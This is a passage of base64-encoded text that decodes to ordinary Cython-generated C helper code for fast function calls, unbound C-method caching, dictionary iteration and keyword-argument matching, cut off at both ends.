mV0dXJuIFB5T2JqZWN0X1ZlY3RvcmNhbGwoZnVuYywgYXJncywgX25hcmdzLCBOVUxMKTtcbiAgICAgICAgICAjZWxzZVxuICAgICAgICAgICAgdmVjdG9yY2FsbGZ1bmMgZiA9IF9fUHl4X1B5VmVjdG9yY2FsbF9GdW5jdGlvbihmdW5jKTtcbiAgICAgICAgICAgIGlmIChmKSB7XG4gICAgICAgICAgICAgICAgcmV0dXJuIGYoZnVuYywgYXJncywgX25hcmdzLCBOVUxMKTtcbiAgICAgICAgICAgIH1cbiAgICAgICAgICAjZW5kaWZcbiAgICAgICAgI2VuZGlmXG4gICAgfVxuICAgIGlmIChuYXJncyA9PSAwKSB7XG4gICAgICAgIHJldHVybiBfX1B5eF9QeU9iamVjdF9DYWxsKGZ1bmMsIF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X2VtcHR5X3R1cGxlLCBrd2FyZ3MpO1xuICAgIH1cbiAgICAjaWYgUFlfVkVSU0lPTl9IRVggPj0gMHgwMzA5MDAwMCAmJiAhQ1lUSE9OX0NPTVBJTElOR19JTl9MSU1JVEVEX0FQSVxuICAgIHJldHVybiBQeU9iamVjdF9WZWN0b3JjYWxsRGljdChmdW5jLCBhcmdzLCAoc2l6ZV90KW5hcmdzLCBrd2FyZ3MpO1xuICAgICNlbHNlXG4gICAgcmV0dXJuIF9fUHl4X1B5T2JqZWN0X0Zhc3RDYWxsX2ZhbGxiYWNrKGZ1bmMsIGFyZ3MsIChzaXplX3QpbmFyZ3MsIGt3YXJncyk7XG4gICAgI2VuZGlmXG59XG5cblxuc3RhdGljIENZVEhPTl9JTkxJTkUgUHlPYmplY3QqIF9fUHl4X1B5T2JqZWN0X0NhbGxPbmVBcmcoUHlPYmplY3QgKmZ1bmMsIFB5T2JqZWN0ICphcmcpIHtcbiAgICBQeU9iamVjdCAqYXJnc1syXSA9IHtOVUxMLCBhcmd9O1xuICAgIHJldHVybiBfX1B5eF9QeU9iamVjdF9GYXN0Q2FsbChmdW5jLCBhcmdzKzEsIDEgfCBfX1B5eF9QWV9WRUNUT1JDQUxMX0FSR1VNRU5UU19PRkZTRVQpO1xufVxuXG5cbiNpZiBDWVRIT05fQ09NUElMSU5HX0lOX0xJTUlURURfQVBJICYmIF9fUFlYX0xJTUlURURfVkVSU0lPTl9IRVggPCAweDAzMEMwMDAwXG5zdGF0aWMgUHlPYmplY3QgKl9fUHl4X1NlbGZsZXNzQ2FsbChQeU9iamVjdCAqbWV0aG9kLCBQeU9iamVjdCAqYXJncywgUHlPYmplY3QgKmt3YXJncykge1xuICAgIFB5T2JqZWN0ICpyZXN1bHQ7XG4gICAgUHlPYmplY3QgKnNlbGZsZXNzX2FyZ3MgPSBQeVR1cGxlX0dldFNsaWNlKGFyZ3MsIDEsIFB5VHVwbGVfU2l6ZShhcmdzKSk7XG4gICAgaWYgKHVubGlrZWx5KCFzZWxmbGVzc19hcmdzKSkgcmV0dXJuIE5VTEw7XG4gICAgcmVzdWx0ID0gUHlPYmplY3RfQ2FsbChtZXRob2QsIHNlbGZsZXNzX2FyZ3MsIGt3YXJncyk7XG4gICAgUHlfREVDUkVGKHNlbGZsZXNzX2FyZ3MpO1xuICAgIHJldHVybiByZXN1bHQ7XG59XG4jZWxpZiBDWVRIT05fQ09NUElMSU5HX0lOX1BZUFkgJiYgUFlfVkVSU0lPTl9IRVggPCAweDAzMDkwMDAwXG5zdGF0aWMgUHlPYmplY3QgKl9fUHl4X1NlbGZsZXNzQ2FsbChQeU9iamVjdCAqbWV0aG9kLCBQeU9iamVjdCAqKmFyZ3MsIFB5X3NzaXplX3QgbmFyZ3MsIFB5T2JqZWN0ICprd25hbWVzKSB7XG4gICAgICAgIHJldHVybiBfUHlPYmplY3RfVmVjdG9yY2FsbFxuICAgICAgICAgICAgKG1ldGhvZCwgYXJncyA/IGFyZ3MrMSA6IE5VTEwsIG5hcmdzID8gbmFyZ3MtMSA6IDAsIGt3bmFtZXMpO1xufVxuI2Vsc2VcbnN0YXRpYyBQeU9iamVjdCAqX19QeXhfU2VsZmxlc3NDYWxsKFB5T2JqZWN0ICptZXRob2QsIFB5T2JqZWN0ICpjb25zdCAqYXJncywgUHlfc3NpemVfdCBuYXJncywgUHlPYmplY3QgKmt3bmFtZXMpIHtcbiAgICByZXR1cm5cbiNpZiBQWV9WRVJTSU9OX0hFWCA8IDB4MDMwOTAwMDBcbiAgICBfUHlPYmplY3RfVmVjdG9yY2FsbFxuI2Vsc2VcbiAgICBQeU9iamVjdF9WZWN0b3JjYWxsXG4jZW5kaWZcbiAgICAgICAgKG1ldGhvZCwgYXJncyA/IGFyZ3MrMSA6IE5VTEwsIG5hcmdzID8gKHNpemVfdCkgbmFyZ3MtMSA6IDAsIGt3bmFtZXMpO1xufVxuI2VuZGlmXG5zdGF0aWMgUHlNZXRob2REZWYgX19QeXhfVW5ib3VuZENNZXRob2RfRGVmID0ge1xuICAgICAiQ3l0aG9uVW5ib3VuZENNZXRob2QiLFxuICAgICBfX1BZWF9SRUlOVEVSUFJFVF9GVU5DSU9OKFB5Q0Z1bmN0aW9uLCBfX1B5eF9TZWxmbGVzc0NhbGwpLFxuI2lmIENZVEhPTl9DT01QSUxJTkdfSU5fTElNSVRFRF9BUEkgJiYgX19QWVhfTElNSVRFRF9WRVJTSU9OX0hFWCA8IDB4MDMwQzAwMDBcbiAgICAgTUVUSF9WQVJBUkdTIHwgTUVUSF9LRVlXT1JEUyxcbiNlbHNlXG4gICAgIE1FVEhfRkFTVENBTEwgfCBNRVRIX0tFWVdPUkRTLFxuI2VuZGlmXG4gICAgIE5VTExcbn07XG5zdGF0aWMgaW50IF9fUHl4X1RyeVVucGFja1VuYm91bmRDTWV0aG9kKF9fUHl4X0NhY2hlZENGdW5jdGlvbiogdGFyZ2V0KSB7XG4gICAgUHlPYmplY3QgKm1ldGhvZCwgKnJlc3VsdD1OVUxMO1xuICAgIG1ldGhvZCA9IF9fUHl4X1B5T2JqZWN0X0dldEF0dHJTdHIodGFyZ2V0LT50eXBlLCAqdGFyZ2V0LT5tZXRob2RfbmFtZSk7XG4gICAgaWYgKHVubGlrZWx5KCFtZXRob2QpKVxuICAgICAgICByZXR1cm4gLTE7XG4gICAgcmVzdWx0ID0gbWV0aG9kO1xuI2lmIENZVEhPTl9DT01QSUxJTkdfSU5fQ1BZVEhPTlxuICAgIGlmIChsaWtlbHkoX19QeXhfVHlwZUNoZWNrKG1ldGhvZCwgJlB5TWV0aG9kRGVzY3JfVHlwZSkpKVxuICAgIHtcbiAgICAgICAgUHlNZXRob2REZXNjck9iamVjdCAqZGVzY3IgPSAoUHlNZXRob2REZXNjck9iamVjdCopIG1ldGhvZDtcbiAgICAgICAgdGFyZ2V0LT5mdW5jID0gZGVzY3ItPmRfbWV0aG9kLT5tbF9tZXRoO1xuICAgICAgICB0YXJnZXQtPmZsYWcgPSBkZXNjci0+ZF9tZXRob2QtPm1sX2ZsYWdzICYgfihNRVRIX0NMQVNTIHwgTUVUSF9TVEFUSUMgfCBNRVRIX0NPRVhJU1QgfCBNRVRIX1NUQUNLTEVTUyk7XG4gICAgfSBlbHNlXG4jZW5kaWZcbiNpZiBDWVRIT05fQ09NUElMSU5HX0lOX1BZUFlcbiNlbHNlXG4gICAgaWYgKFB5Q0Z1bmN0aW9uX0NoZWNrKG1ldGhvZCkpXG4jZW5kaWZcbiAgICB7XG4gICAgICAgIFB5T2JqZWN0ICpzZWxmO1xuICAgICAgICBpbnQgc2VsZl9mb3VuZDtcbiNpZiBDWVRIT05fQ09NUElMSU5HX0lOX0xJTUlURURfQVBJIHx8IENZVEhPTl9DT01QSUxJTkdfSU5fUFlQWVxuICAgICAgICBzZWxmID0gUHlPYmplY3RfR2V0QXR0clN0cmluZyhtZXRob2QsICJfX3NlbGZfXyIpO1xuICAgICAgICBpZiAoIXNlbGYpIHtcbiAgICAgICAgICAgIFB5RXJyX0NsZWFyKCk7XG4gICAgICAgIH1cbiNlbHNlXG4gICAgICAgIHNlbGYgPSBQeUNGdW5jdGlvbl9HRVRfU0VMRihtZXRob2QpO1xuI2VuZGlmXG4gICAgICAgIHNlbGZfZm91bmQgPSAoc2VsZiAmJiBzZWxmICE9IFB5X05vbmUpO1xuI2lmIENZVEhPTl9DT01QSUxJTkdfSU5fTElNSVRFRF9BUEkgfHwgQ1lUSE9OX0NPTVBJTElOR19JTl9QWVBZXG4gICAgICAgIFB5X1hERUNSRUYoc2VsZik7XG4jZW5kaWZcbiAgICAgICAgaWYgKHNlbGZfZm91bmQpIHtcbiAgICAgICAgICAgIFB5T2JqZWN0ICp1bmJvdW5kX21ldGhvZCA9IFB5Q0Z1bmN0aW9uX05ldygmX19QeXhfVW5ib3VuZENNZXRob2RfRGVmLCBtZXRob2QpO1xuICAgICAgICAgICAgaWYgKHVubGlrZWx5KCF1bmJvdW5kX21ldGhvZCkpIHJldHVybiAtMTtcbiAgICAgICAgICAgIFB5X0RFQ1JFRihtZXRob2QpO1xuICAgICAgICAgICAgcmVzdWx0ID0gdW5ib3VuZF9tZXRob2Q7XG4gICAgICAgIH1cbiAgICB9XG4jaWYgIUNZVEhPTl9DT01QSUxJTkdfSU5fQ1BZVEhPTl9GUkVFVEhSRUFESU5HXG4gICAgaWYgKHVubGlrZWx5KHRhcmdldC0+bWV0aG9kKSkge1xuICAgICAgICBQeV9ERUNSRUYocmVzdWx0KTtcbiAgICB9IGVsc2VcbiNlbmRpZlxuICAgIHRhcmdldC0+bWV0aG9kID0gcmVzdWx0O1xuICAgIHJldHVybiAwO1xufVxuXG5cbiNpZiBDWVRIT05fQ09NUElMSU5HX0lOX0NQWVRIT05cbnN0YXRpYyBDWVRIT05fSU5MSU5FIFB5T2JqZWN0KiBfX1B5eF9DYWxsVW5ib3VuZENNZXRob2QwKF9fUHl4X0NhY2hlZENGdW5jdGlvbiogY2Z1bmMsIFB5T2JqZWN0KiBzZWxmKSB7XG4gICAgaW50IHdhc19pbml0aWFsaXplZCA9IF9fUHl4X0NhY2hlZENGdW5jdGlvbl9HZXRBbmRTZXRJbml0aWFsaXppbmcoY2Z1bmMpO1xuICAgIGlmIChsaWtlbHkod2FzX2luaXRpYWxpemVkID09IDIgJiYgY2Z1bmMtPmZ1bmMpKSB7XG4gICAgICAgIGlmIChsaWtlbHkoY2Z1bmMtPmZsYWcgPT0gTUVUSF9OT0FSR1MpKVxuICAgICAgICAgICAgcmV0dXJuIF9fUHl4X0NhbGxDRnVuY3Rpb24oY2Z1bmMsIHNlbGYsIE5VTEwpO1xuICAgICAgICBpZiAobGlrZWx5KGNmdW5jLT5mbGFnID09IE1FVEhfRkFTVENBTEwpKVxuICAgICAgICAgICAgcmV0dXJuIF9fUHl4X0NhbGxDRnVuY3Rpb25GYXN0KGNmdW5jLCBzZWxmLCBOVUxMLCAwKTtcbiAgICAgICAgaWYgKGNmdW5jLT5mbGFnID09IChNRVRIX0ZBU1RDQUxMIHwgTUVUSF9LRVlXT1JEUykpXG4gICAgICAgICAgICByZXR1cm4gX19QeXhfQ2FsbENGdW5jdGlvbkZhc3RXaXRoS2V5d29yZHMoY2Z1bmMsIHNlbGYsIE5VTEwsIDAsIE5VTEwpO1xuICAgICAgICBpZiAobGlrZWx5KGNmdW5jLT5mbGFnID09IChNRVRIX1ZBUkFSR1MgfCBNRVRIX0tFWVdPUkRTKSkpXG4gICAgICAgICAgICByZXR1cm4gX19QeXhfQ2FsbENGdW5jdGlvbldpdGhLZXl3b3JkcyhjZnVuYywgc2VsZiwgX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfZW1wdHlfdHVwbGUsIE5VTEwpO1xuICAgICAgICBpZiAoY2Z1bmMtPmZsYWcgPT0gTUVUSF9WQVJBUkdTKVxuICAgICAgICAgICAgcmV0dXJuIF9fUHl4X0NhbGxDRnVuY3Rpb24oY2Z1bmMsIHNlbGYsIF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X2VtcHR5X3R1cGxlKTtcbiAgICAgICAgcmV0dXJuIF9fUHl4X19DYWxsVW5ib3VuZENNZXRob2QwKGNmdW5jLCBzZWxmKTtcbiAgICB9XG4jaWYgQ1lUSE9OX0NPTVBJTElOR19JTl9DUFlUSE9OX0ZSRUVUSFJFQURJTkdcbiAgICBlbHNlIGlmICh1bmxpa2VseSh3YXNfaW5pdGlhbGl6ZWQgPT0gMSkpIHtcbiAgICAgICAgX19QeXhfQ2FjaGVkQ0Z1bmN0aW9uIHRtcF9jZnVuYyA9IHtcbiNpZm5kZWYgX19jcGx1c3BsdXNcbiAgICAgICAgICAgIDBcbiNlbmRpZlxuICAgICAgICB9O1xuICAgICAgICB0bXBfY2Z1bmMudHlwZSA9IGNmdW5jLT50eXBlO1xuICAgICAgICB0bXBfY2Z1bmMubWV0aG9kX25hbWUgPSBjZnVuYy0+bWV0aG9kX25hbWU7XG4gICAgICAgIHJldHVybiBfX1B5eF9fQ2FsbFVuYm91bmRDTWV0aG9kMCgmdG1wX2NmdW5jLCBzZWxmKTtcbiAgICB9XG4jZW5kaWZcbiAgICBQeU9iamVjdCAqcmVzdWx0ID0gX19QeXhfX0NhbGxVbmJvdW5kQ01ldGhvZDAoY2Z1bmMsIHNlbGYpO1xuICAgIF9fUHl4X0NhY2hlZENGdW5jdGlvbl9TZXRGaW5pc2hlZEluaXRpYWxpemluZyhjZnVuYyk7XG4gICAgcmV0dXJuIHJlc3VsdDtcbn1cbiNlbmRpZlxuc3RhdGljIFB5T2JqZWN0KiBfX1B5eF9fQ2FsbFVuYm91bmRDTWV0aG9kMChfX1B5eF9DYWNoZWRDRnVuY3Rpb24qIGNmdW5jLCBQeU9iamVjdCogc2VsZikge1xuICAgIFB5T2JqZWN0ICpyZXN1bHQ7XG4gICAgaWYgKHVubGlrZWx5KCFjZnVuYy0+bWV0aG9kKSAmJiB1bmxpa2VseShfX1B5eF9UcnlVbnBhY2tVbmJvdW5kQ01ldGhvZChjZnVuYykgPCAwKSkgcmV0dXJuIE5VTEw7XG4gICAgcmVzdWx0ID0gX19QeXhfUHlPYmplY3RfQ2FsbE9uZUFyZyhjZnVuYy0+bWV0aG9kLCBzZWxmKTtcbiAgICByZXR1cm4gcmVzdWx0O1xufVxuXG5cbnN0YXRpYyBDWVRIT05fSU5MSU5FIFB5T2JqZWN0KiBfX1B5eF9QeURpY3RfSXRlbXMoUHlPYmplY3QqIGQpIHtcbiAgICByZXR1cm4gX19QeXhfQ2FsbFVuYm91bmRDTWV0aG9kMCgmX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfdW1ldGhvZF9QeURpY3RfVHlwZV9pdGVtcywgZCk7XG59XG5cblxuc3RhdGljIENZVEhPTl9JTkxJTkUgUHlPYmplY3QqIF9fUHl4X1B5RGljdF9WYWx1ZXMoUHlPYmplY3QqIGQpIHtcbiAgICByZXR1cm4gX19QeXhfQ2FsbFVuYm91bmRDTWV0aG9kMCgmX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfdW1ldGhvZF9QeURpY3RfVHlwZV92YWx1ZXMsIGQpO1xufVxuXG5cbiNpZiBDWVRIT05fQVZPSURfQk9SUk9XRURfUkVGU1xuc3RhdGljIGludCBfX1B5eF9QeURpY3RfTmV4dFJlZihQeU9iamVjdCAqcCwgUHlPYmplY3QgKipwcG9zLCBQeU9iamVjdCAqKnBrZXksIFB5T2JqZWN0ICoqcHZhbHVlKSB7XG4gICAgUHlPYmplY3QgKm5leHQgPSBOVUxMO1xuICAgIGlmICghKnBwb3MpIHtcbiAgICAgICAgaWYgKHB2YWx1ZSkge1xuICAgICAgICAgICAgUHlPYmplY3QgKmRpY3R2aWV3ID0gcGtleSA/IF9fUHl4X1B5RGljdF9JdGVtcyhwKSA6IF9fUHl4X1B5RGljdF9WYWx1ZXMocCk7XG4gICAgICAgICAgICBpZiAodW5saWtlbHkoIWRpY3R2aWV3KSkgZ290byBiYWQ7XG4gICAgICAgICAgICAqcHBvcyA9IFB5T2JqZWN0X0dldEl0ZXIoZGljdHZpZXcpO1xuICAgICAgICAgICAgUHlfREVDUkVGKGRpY3R2aWV3KTtcbiAgICAgICAgfSBlbHNlIHtcbiAgICAgICAgICAgICpwcG9zID0gUHlPYmplY3RfR2V0SXRlcihwKTtcbiAgICAgICAgfVxuICAgICAgICBpZiAodW5saWtlbHkoISpwcG9zKSkgZ290byBiYWQ7XG4gICAgfVxuICAgIG5leHQgPSBQeUl0ZXJfTmV4dCgqcHBvcyk7XG4gICAgaWYgKCFuZXh0KSB7XG4gICAgICAgIGlmIChQeUVycl9PY2N1cnJlZCgpKSBnb3RvIGJhZDtcbiAgICAgICAgcmV0dXJuIDA7XG4gICAgfVxuICAgIGlmIChwa2V5ICYmIHB2YWx1ZSkge1xuICAgICAgICAqcGtleSA9IF9fUHl4X1B5U2VxdWVuY2VfSVRFTShuZXh0LCAwKTtcbiAgICAgICAgaWYgKHVubGlrZWx5KCpwa2V5KSkgZ290byBiYWQ7XG4gICAgICAgICpwdmFsdWUgPSBfX1B5eF9QeVNlcXVlbmNlX0lURU0obmV4dCwgMSk7XG4gICAgICAgIGlmICh1bmxpa2VseSgqcHZhbHVlKSkgZ290byBiYWQ7XG4gICAgICAgIFB5X0RFQ1JFRihuZXh0KTtcbiAgICB9IGVsc2UgaWYgKHBrZXkpIHtcbiAgICAgICAgKnBrZXkgPSBuZXh0O1xuICAgIH0gZWxzZSB7XG4gICAgICAgIGFzc2VydChwdmFsdWUpO1xuICAgICAgICAqcHZhbHVlID0gbmV4dDtcbiAgICB9XG4gICAgcmV0dXJuIDE7XG4gIGJhZDpcbiAgICBQeV9YREVDUkVGKG5leHQpO1xuI2lmICFDWVRIT05fQ09NUElMSU5HX0lOX0xJTUlURURfQVBJICYmIFBZX1ZFUlNJT05fSEVYID49IDB4MDMwZDAwMDBcbiAgICBQeUVycl9Gb3JtYXRVbnJhaXNhYmxlKCJFeGNlcHRpb24gaWdub3JlZCBpbiBfX1B5eF9QeURpY3RfTmV4dFJlZiIpO1xuI2Vsc2VcbiAgICBQeUVycl9Xcml0ZVVucmFpc2FibGUoX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfbl91X1B5eF9QeURpY3RfTmV4dFJlZik7XG4jZW5kaWZcbiAgICBpZiAocGtleSkgKnBrZXkgPSBOVUxMO1xuICAgIGlmIChwdmFsdWUpICpwdmFsdWUgPSBOVUxMO1xuICAgIHJldHVybiAwO1xufVxuI2Vsc2UgLy8gIUNZVEhPTl9BVk9JRF9CT1JST1dFRF9SRUZTXG5zdGF0aWMgaW50IF9fUHl4X1B5RGljdF9OZXh0UmVmKFB5T2JqZWN0ICpwLCBQeV9zc2l6ZV90ICpwcG9zLCBQeU9iamVjdCAqKnBrZXksIFB5T2JqZWN0ICoqcHZhbHVlKSB7XG4gICAgaW50IHJlc3VsdCA9IFB5RGljdF9OZXh0KHAsIHBwb3MsIHBrZXksIHB2YWx1ZSk7XG4gICAgaWYgKGxpa2VseShyZXN1bHQgPT0gMSkpIHtcbiAgICAgICAgaWYgKHBrZXkpIFB5X0lOQ1JFRigqcGtleSk7XG4gICAgICAgIGlmIChwdmFsdWUpIFB5X0lOQ1JFRigqcHZhbHVlKTtcbiAgICB9XG4gICAgcmV0dXJuIHJlc3VsdDtcbn1cbiNlbmRpZlxuXG5cbnN0YXRpYyB2b2lkIF9fUHl4X1JhaXNlRG91YmxlS2V5d29yZHNFcnJvcihcbiAgICBjb25zdCBjaGFyKiBmdW5jX25hbWUsXG4gICAgUHlPYmplY3QqIGt3X25hbWUpXG57XG4gICAgUHlFcnJfRm9ybWF0KFB5RXhjX1R5cGVFcnJvcixcbiAgICAgICAgIiVzKCkgZ290IG11bHRpcGxlIHZhbHVlcyBmb3Iga2V5d29yZCBhcmd1bWVudCBcJyVVXCciLCBmdW5jX25hbWUsIGt3X25hbWUpO1xufVxuXG5cbiNpZiBDWVRIT05fQ09NUElMSU5HX0lOX0NQWVRIT05cbnN0YXRpYyBDWVRIT05fSU5MSU5FIFB5T2JqZWN0ICpfX1B5eF9DYWxsVW5ib3VuZENNZXRob2QyKF9fUHl4X0NhY2hlZENGdW5jdGlvbiAqY2Z1bmMsIFB5T2JqZWN0ICpzZWxmLCBQeU9iamVjdCAqYXJnMSwgUHlPYmplY3QgKmFyZzIpIHtcbiAgICBpbnQgd2FzX2luaXRpYWxpemVkID0gX19QeXhfQ2FjaGVkQ0Z1bmN0aW9uX0dldEFuZFNldEluaXRpYWxpemluZyhjZnVuYyk7XG4gICAgaWYgKGxpa2VseSh3YXNfaW5pdGlhbGl6ZWQgPT0gMiAmJiBjZnVuYy0+ZnVuYykpIHtcbiAgICAgICAgUHlPYmplY3QgKmFyZ3NbMl0gPSB7YXJnMSwgYXJnMn07XG4gICAgICAgIGlmIChjZnVuYy0+ZmxhZyA9PSBNRVRIX0ZBU1RDQUxMKSB7XG4gICAgICAgICAgICByZXR1cm4gX19QeXhfQ2FsbENGdW5jdGlvbkZhc3QoY2Z1bmMsIHNlbGYsIGFyZ3MsIDIpO1xuICAgICAgICB9XG4gICAgICAgIGlmIChjZnVuYy0+ZmxhZyA9PSAoTUVUSF9GQVNUQ0FMTCB8IE1FVEhfS0VZV09SRFMpKVxuICAgICAgICAgICAgcmV0dXJuIF9fUHl4X0NhbGxDRnVuY3Rpb25GYXN0V2l0aEtleXdvcmRzKGNmdW5jLCBzZWxmLCBhcmdzLCAyLCBOVUxMKTtcbiAgICB9XG4jaWYgQ1lUSE9OX0NPTVBJTElOR19JTl9DUFlUSE9OX0ZSRUVUSFJFQURJTkdcbiAgICBlbHNlIGlmICh1bmxpa2VseSh3YXNfaW5pdGlhbGl6ZWQgPT0gMSkpIHtcbiAgICAgICAgX19QeXhfQ2FjaGVkQ0Z1bmN0aW9uIHRtcF9jZnVuYyA9IHtcbiNpZm5kZWYgX19jcGx1c3BsdXNcbiAgICAgICAgICAgIDBcbiNlbmRpZlxuICAgICAgICB9O1xuICAgICAgICB0bXBfY2Z1bmMudHlwZSA9IGNmdW5jLT50eXBlO1xuICAgICAgICB0bXBfY2Z1bmMubWV0aG9kX25hbWUgPSBjZnVuYy0+bWV0aG9kX25hbWU7XG4gICAgICAgIHJldHVybiBfX1B5eF9fQ2FsbFVuYm91bmRDTWV0aG9kMigmdG1wX2NmdW5jLCBzZWxmLCBhcmcxLCBhcmcyKTtcbiAgICB9XG4jZW5kaWZcbiAgICBQeU9iamVjdCAqcmVzdWx0ID0gX19QeXhfX0NhbGxVbmJvdW5kQ01ldGhvZDIoY2Z1bmMsIHNlbGYsIGFyZzEsIGFyZzIpO1xuICAgIF9fUHl4X0NhY2hlZENGdW5jdGlvbl9TZXRGaW5pc2hlZEluaXRpYWxpemluZyhjZnVuYyk7XG4gICAgcmV0dXJuIHJlc3VsdDtcbn1cbiNlbmRpZlxuc3RhdGljIFB5T2JqZWN0KiBfX1B5eF9fQ2FsbFVuYm91bmRDTWV0aG9kMihfX1B5eF9DYWNoZWRDRnVuY3Rpb24qIGNmdW5jLCBQeU9iamVjdCogc2VsZiwgUHlPYmplY3QqIGFyZzEsIFB5T2JqZWN0KiBhcmcyKXtcbiAgICBpZiAodW5saWtlbHkoIWNmdW5jLT5mdW5jICYmICFjZnVuYy0+bWV0aG9kKSAmJiB1bmxpa2VseShfX1B5eF9UcnlVbnBhY2tVbmJvdW5kQ01ldGhvZChjZnVuYykgPCAwKSkgcmV0dXJuIE5VTEw7XG4jaWYgQ1lUSE9OX0NPTVBJTElOR19JTl9DUFlUSE9OXG4gICAgaWYgKGNmdW5jLT5mdW5jICYmIChjZnVuYy0+ZmxhZyAmIE1FVEhfVkFSQVJHUykpIHtcbiAgICAgICAgUHlPYmplY3QgKnJlc3VsdCA9IE5VTEw7XG4gICAgICAgIFB5T2JqZWN0ICphcmdzID0gUHlUdXBsZV9OZXcoMik7XG4gICAgICAgIGlmICh1bmxpa2VseSghYXJncykpIHJldHVybiBOVUxMO1xuICAgICAgICBQeV9JTkNSRUYoYXJnMSk7XG4gICAgICAgIFB5VHVwbGVfU0VUX0lURU0oYXJncywgMCwgYXJnMSk7XG4gICAgICAgIFB5X0lOQ1JFRihhcmcyKTtcbiAgICAgICAgUHlUdXBsZV9TRVRfSVRFTShhcmdzLCAxLCBhcmcyKTtcbiAgICAgICAgaWYgKGNmdW5jLT5mbGFnICYgTUVUSF9LRVlXT1JEUylcbiAgICAgICAgICAgIHJlc3VsdCA9IF9fUHl4X0NhbGxDRnVuY3Rpb25XaXRoS2V5d29yZHMoY2Z1bmMsIHNlbGYsIGFyZ3MsIE5VTEwpO1xuICAgICAgICBlbHNlXG4gICAgICAgICAgICByZXN1bHQgPSBfX1B5eF9DYWxsQ0Z1bmN0aW9uKGNmdW5jLCBzZWxmLCBhcmdzKTtcbiAgICAgICAgUHlfREVDUkVGKGFyZ3MpO1xuICAgICAgICByZXR1cm4gcmVzdWx0O1xuICAgIH1cbiNlbmRpZlxuICAgIHtcbiAgICAgICAgUHlPYmplY3QgKmFyZ3NbNF0gPSB7TlVMTCwgc2VsZiwgYXJnMSwgYXJnMn07XG4gICAgICAgIHJldHVybiBfX1B5eF9QeU9iamVjdF9GYXN0Q2FsbChjZnVuYy0+bWV0aG9kLCBhcmdzKzEsIDMgfCBfX1B5eF9QWV9WRUNUT1JDQUxMX0FSR1VNRU5UU19PRkZTRVQpO1xuICAgIH1cbn1cblxuXG5zdGF0aWMgaW50IF9fUHl4X1ZhbGlkYXRlRHVwbGljYXRlUG9zQXJncyhcbiAgICBQeU9iamVjdCAqa3dkcyxcbiAgICBQeU9iamVjdCAqKiBjb25zdCBhcmduYW1lc1tdLFxuICAgIFB5T2JqZWN0ICoqIGNvbnN0ICpmaXJzdF9rd19hcmcsXG4gICAgY29uc3QgY2hhciogZnVuY3Rpb25fbmFtZSlcbntcbiAgICBQeU9iamVjdCAqKiBjb25zdCAqbmFtZSA9IGFyZ25hbWVzO1xuICAgIHdoaWxlIChuYW1lICE9IGZpcnN0X2t3X2FyZykge1xuICAgICAgICBQeU9iamVjdCAqa2V5ID0gKipuYW1lO1xuICAgICAgICBpbnQgZm91bmQgPSBQeURpY3RfQ29udGFpbnMoa3dkcywga2V5KTtcbiAgICAgICAgaWYgKHVubGlrZWx5KGZvdW5kKSkge1xuICAgICAgICAgICAgaWYgKGZvdW5kID09IDEpIF9fUHl4X1JhaXNlRG91YmxlS2V5d29yZHNFcnJvcihmdW5jdGlvbl9uYW1lLCBrZXkpO1xuICAgICAgICAgICAgZ290byBiYWQ7XG4gICAgICAgIH1cbiAgICAgICAgbmFtZSsrO1xuICAgIH1cbiAgICByZXR1cm4gMDtcbmJhZDpcbiAgICByZXR1cm4gLTE7XG59XG4jaWYgQ1lUSE9OX1VTRV9VTklDT0RFX0lOVEVSTkFMU1xuc3RhdGljIENZVEhPTl9JTkxJTkUgaW50IF9fUHl4X1VuaWNvZGVLZXl3b3Jkc0VxdWFsKFB5T2JqZWN0ICpzMSwgUHlPYmplY3QgKnMyKSB7XG4gICAgaW50IGtpbmQ7XG4gICAgUHlfc3NpemVfdCBsZW4gPSBQeVVuaWNvZGVfR0VUX0xFTkdUSChzMSk7XG4gICAgaWYgKGxlbiAhPSBQeVVuaWNvZGVfR0VUX0xFTkdUSChzMikpIHJldHVybiAwO1xuICAgIGtpbmQgPSBQeVVuaWNvZGVfS0lORChzMSk7XG4gICAgaWYgKGtpbmQgIT0gUHlVbmljb2RlX0tJTkQoczIpKSByZXR1cm4gMDtcbiAgICBjb25zdCB2b2lkICpkYXRhMSA9IFB5VW5pY29kZV9EQVRBKHMxKTtcbiAgICBjb25zdCB2b2lkICpkYXRhMiA9IFB5VW5pY29kZV9EQVRBKHMyKTtcbiAgICByZXR1cm4gKG1lbWNtcChkYXRhMSwgZGF0YTIsIChzaXplX3QpIGxlbiAqIChzaXplX3QpIGtpbmQpID09IDApO1xufVxuI2VuZGlmXG5zdGF0aWMgaW50IF9fUHl4X01hdGNoS2V5d29yZEFyZ19zdHIoXG4gICAgUHlPYmplY3QgKmtleSxcbiAgICBQeU9iamVjdCAqKiBjb25zdCBhcmduYW1lc1tdLFxuICAgIFB5T2JqZWN0ICoqIGNvbnN0ICpmaXJzdF9rd19hcmcsXG4gICAgc2l6ZV90ICppbmRleF9mb3VuZCxcbiAgICBjb25zdCBjaGFyICpmdW5jdGlvbl9uYW1lKVxue1xuICAgIFB5T2JqZWN0ICoqIGNvbnN0ICpuYW1lO1xuICAgICNpZiBDWVRIT05fVVNFX1VOSUNPREVfSU5URVJOQUxTXG4gICAgUHlfaGFzaF90IGtleV9oYXNoID0gKChQeUFTQ0lJT2JqZWN0KilrZXkpLT5oYXNoO1xuICAgIGlmICh1bmxpa2VseShrZXlfaGFzaCA9PSAtMSkpIHtcbiAgICAgICAga2V5X2hhc2ggPSBQeU9iamVjdF9IYXNoKGtleSk7XG4gICAgICAgIGlmICh1bmxpa2VseShrZXlfaGFzaCA9PSAtMSkpXG4gICAgICAgICAgICBnb3RvIGJhZDtcbiAgICB9XG4gICAgI2VuZGlmXG4gICAgbmFtZSA9IGZpcnN0X2t3X2FyZztcbiAgICB3aGlsZSAoKm5hbWUpIHtcbiAgICAgICAgUHlPYmplY3QgKm5hbWVfc3RyID0gKipuYW1lO1xuICAgICAgICAjaWYgQ1lUSE9OX1VTRV9VTklDT0RFX0lOVEVSTkFMU1xuICAgICAgICBpZiAoa2V5X2hhc2ggPT0gKChQeUFTQ0lJT2JqZWN0KiluYW1lX3N0ciktPmhhc2ggJiYgX19QeXhfVW5pY29kZUtleXdvcmRzRXF1YWwobmFtZV9zdHIsIGtleSkpIHtcbiAgICAgICAgICAgICppbmRleF9mb3VuZCA9IChzaXplX3QpIChuY